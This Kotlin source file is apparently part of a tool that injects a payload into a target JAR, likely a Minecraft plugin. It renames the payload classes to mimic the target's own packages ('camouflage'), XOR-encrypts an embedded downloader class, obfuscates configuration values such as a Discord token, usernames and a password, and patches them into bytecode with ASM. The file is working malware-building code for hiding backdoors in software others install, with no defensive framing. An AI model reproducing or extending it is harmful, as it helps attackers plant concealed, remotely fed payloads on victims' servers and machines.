package com.tmquan2508.inject.injector.modules

import com.rikonardo.cafebabe.ClassFile
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.utils.JavaVersion
import com.tmquan2508.inject.utils.generateCamouflagePlan
import com.tmquan2508.inject.utils.setClassVersion
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.commons.ClassRemapper
import org.objectweb.asm.commons.SimpleRemapper
import org.objectweb.asm.tree.ClassNode
import org.objectweb.asm.tree.LdcInsnNode
import java.io.File
import java.security.SecureRandom
import java.util.Base64

data class ProcessedPayload(
    val otherClasses: List<ClassFile>,
    val finalMainPayloadName: String,
    val finalMainPayloadBytes: ByteArray
)

private const val DOWNLOADER_CLASS_NAME = "com/tmquan2508/payload/FileDownloader.class"

internal fun processPayload(
    rawPayloadClasses: List<ClassFile>,
    camouflageEnabled: Boolean,
    targetJar: File,
    dominantVersion: JavaVersion,
    uuids: String,
    usernames: String,
    prefix: String,
    injectOther: String,
    warnings: String,
    discordToken: String,
    password: String,
    camouflage: String
): ProcessedPayload {
    val originalMainPayloadName = "com/tmquan2508/exploit/Config"
    val originalPackage = "com/tmquan2508/exploit"

    val downloaderBytes = ProcessedPayload::class.java.classLoader.getResourceAsStream(DOWNLOADER_CLASS_NAME)?.readBytes()
        ?: throw IllegalStateException("Could not find internal downloader class: '$DOWNLOADER_CLASS_NAME'. The injector JAR might be corrupted.")

    val relocationMap: Map<String, String>
    val finalMainPayloadName: String

    if (camouflageEnabled) {
        Logs.info(" -> Camouflage enabled. Generating camouflage plan...")
        val plan = generateCamouflagePlan(targetJar)
        Logs.info(" -> Selected camouflage package: '${plan.packageName}' with new base name '${plan.namePrefix}'")

        val newPackage = plan.packageName
        val newBaseName = plan.namePrefix
        finalMainPayloadName = "$newPackage/$newBaseName"
        val newSupportPackage = "$newPackage/${newBaseName}Support"

        val mainClassRule = originalMainPayloadName to finalMainPayloadName
        val supportClassesRule = originalPackage to newSupportPackage

        relocationMap = rawPayloadClasses.associate { clazz ->
            val originalName = clazz.name
            val newName = if (originalName.startsWith("$originalMainPayloadName\$") || originalName == originalMainPayloadName) {
                mainClassRule.second + originalName.substring(mainClassRule.first.length)
            } else if (originalName.startsWith(originalPackage)) {
                supportClassesRule.second + originalName.substring(supportClassesRule.first.length)
            } else {
                originalName
            }
            originalName to newName
        }
    } else {
        relocationMap = emptyMap()
        finalMainPayloadName = originalMainPayloadName
    }

    val transformedBytecodeMap = transformAndRelocatePayload(rawPayloadClasses, relocationMap, dominantVersion)

    val configuredBytecodeMap = applyConfigurationWithAsm(
        originalBytecodeMap = transformedBytecodeMap,
        targetClassName = finalMainPayloadName,
        downloaderBytes = downloaderBytes,
        uuids = uuids, usernames = usernames, prefix = prefix, injectOther = injectOther,
        warnings = warnings, discordToken = discordToken, password = password, camouflage = camouflage
    )

    val finalMainPayloadBytes = configuredBytecodeMap[finalMainPayloadName]
        ?: throw IllegalStateException("Main payload class '$finalMainPayloadName' not found after configuration.")

    val otherClassesAsClassFile = configuredBytecodeMap
        .filterKeys { it != finalMainPayloadName }
        .map { (name, bytes) -> ClassFile(bytes).apply { this.name = name } }

    return ProcessedPayload(
        otherClasses = otherClassesAsClassFile,
        finalMainPayloadName = finalMainPayloadName,
        finalMainPayloadBytes = finalMainPayloadBytes
    )
}

private fun transformAndRelocatePayload(
    rawClasses: List<ClassFile>,
    relocationMap: Map<String, String>,
    dominantVersion: JavaVersion
): Map<String, ByteArray> {
    if (relocationMap.isEmpty()) {
        return rawClasses.associate { it.name to it.compile() }
    }

    val remapper = SimpleRemapper(relocationMap)
    val transformedBytecode = mutableMapOf<String, ByteArray>()

    Logs.info(" -> Transforming and relocating payload classes with ASM...")
    rawClasses.forEach { classFile ->
        val originalName = classFile.name
        val newName = relocationMap[originalName] ?: originalName

        val reader = ClassReader(classFile.compile())
        val writer = ClassWriter(ClassWriter.COMPUTE_FRAMES)
        val classRemapper = ClassRemapper(writer, remapper)
        reader.accept(classRemapper, ClassReader.EXPAND_FRAMES)
        val finalBytecode = writer.toByteArray()
        setClassVersion(finalBytecode, dominantVersion)

        transformedBytecode[newName] = finalBytecode
        Logs.debug("  [ASM-REMAP] '${originalName}' -> '${newName}'")
    }
    return transformedBytecode
}

private object AsmValueInjector {
    private object StaticKeyEncoder {
        private const val SECRET_KEY = "openbd.secret.key"
        fun encrypt(plainText: String): String {
            val inputBytes = plainText.toByteArray(Charsets.UTF_8)
            val keyBytes = SECRET_KEY.toByteArray(Charsets.UTF_8)
            val outputBytes = ByteArray(inputBytes.size) { i -> (inputBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte() }
            return Base64.getEncoder().encodeToString(outputBytes)
        }
    }
    private fun generateRandomKey(length: Int): String {
        val chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        val rnd = SecureRandom()
        return (1..length).map { chars[rnd.nextInt(chars.length)] }.joinToString("")
    }
    private fun encryptPayload(plainBytes: ByteArray, key: String): String {
        val keyBytes = key.toByteArray(Charsets.UTF_8)
        val result = ByteArray(plainBytes.size) { i -> (plainBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte() }
        return Base64.getEncoder().encodeToString(result)
    }

    fun inject(originalBytecode: ByteArray, placeholders: Map<String, String>): ByteArray {
        val classReader = ClassReader(originalBytecode)
        val classNode = ClassNode()
        classReader.accept(classNode, 0)
        var changed = false
        classNode.methods.forEach { method ->
            method.instructions.forEach { instruction ->
                if (instruction is LdcInsnNode && instruction.cst is String && placeholders.containsKey(instruction.cst as String)) {
                    val placeholder = instruction.cst as String
                    instruction.cst = placeholders[placeholder]
                    Logs.debug("  [ASM-LDC] Replaced '$placeholder' in ${classNode.name}.${method.name}")
                    changed = true
                }
            }
        }
        if (!changed) {
            Logs.debug(" -> [ASM-LDC] No placeholders found in ${classNode.name}. Skipping modification.")
        }
        val classWriter = ClassWriter(ClassWriter.COMPUTE_FRAMES)
        classNode.accept(classWriter)
        return classWriter.toByteArray()
    }

    fun buildFinalPlaceholderMap(
        downloaderBytes: ByteArray,
        uuids: String, usernames: String, prefix: String, injectOther: String, warnings: String,
        discordToken: String, password: String, camouflage: String
    ): Map<String, String> {
        val finalMap = mutableMapOf<String, String>()
        Logs.info("-> Preparing to inject encrypted downloader payload...")
        val key = generateRandomKey(32)
        val encryptedPayload = encryptPayload(downloaderBytes, key)
        val payloadSizeKb = encryptedPayload.toByteArray(Charsets.UTF_8).size / 1024.0
        Logs.info(String.format("  [INJECT] Injecting '::ENCRYPTED_PAYLOAD::' -> Size: %.2f KB", payloadSizeKb))

        finalMap["::KEY::"] = key
        finalMap["::ENCRYPTED_PAYLOAD::"] = encryptedPayload
        finalMap["::DOWNLOADER_CLASS_NAME::"] = DOWNLOADER_CLASS_NAME.replace(".class", "").replace('/', '.')

        val otherConfigs = mapOf(
            "::UUIDS::" to uuids, "::USERNAMES::" to usernames, "::PREFIX::" to prefix,
            "::INJECT_OTHER::" to injectOther, "::WARNINGS::" to warnings, "::DISCORD_TOKEN::" to discordToken,
            "::PASSWORD::" to password, "::CAMOUFLAGE::" to camouflage, "::TRUE::" to "true"
        )
        
        otherConfigs.forEach { (placeholder, plainText) ->
            val encryptedValue = StaticKeyEncoder.encrypt(plainText)
            finalMap[placeholder] = encryptedValue
            Logs.debug("  [ENCRYPT-STATIC] '$placeholder' -> '${encryptedValue.take(15)}...'")
        }
        return finalMap
    }
}

private fun applyConfigurationWithAsm(
    originalBytecodeMap: Map<String, ByteArray>,
    targetClassName: String,
    downloaderBytes: ByteArray,
    uuids: String, usernames: String, prefix: String, injectOther: String,
    warnings: String, discordToken: String, password: String, camouflage: String
): Map<String, ByteArray> {
    val replacementMap = AsmValueInjector.buildFinalPlaceholderMap(
        downloaderBytes, uuids, usernames, prefix, injectOther, warnings, discordToken, password, camouflage
    )

    val mainClassBytes = originalBytecodeMap[targetClassName]
        ?: throw IllegalStateException("Configuration target class '$targetClassName' not found in transformed bytecode map.")

    val mainClassNode = ClassNode().also { ClassReader(mainClassBytes).accept(it, 0) }

    val classesToPatch = mutableSetOf(targetClassName)
    mainClassNode.innerClasses?.forEach { innerClassNode ->
        if (innerClassNode.outerName == mainClassNode.name) {
            Logs.debug("  [DISCOVERY] Found nested class: ${innerClassNode.name}")
            classesToPatch.add(innerClassNode.name)
        }
    }

    val finalBytecodeMap = mutableMapOf<String, ByteArray>()
    originalBytecodeMap.forEach { (className, originalBytes) ->
        if (className in classesToPatch) {
            Logs.debug("  [PATCH] Applying configuration to $className")
            finalBytecodeMap[className] = AsmValueInjector.inject(originalBytes, replacementMap)
        } else {
            finalBytecodeMap[className] = originalBytes
        }
    }

    Logs.info(" -> Successfully applied combined encrypted configuration using ASM.")
    return finalBytecodeMap
}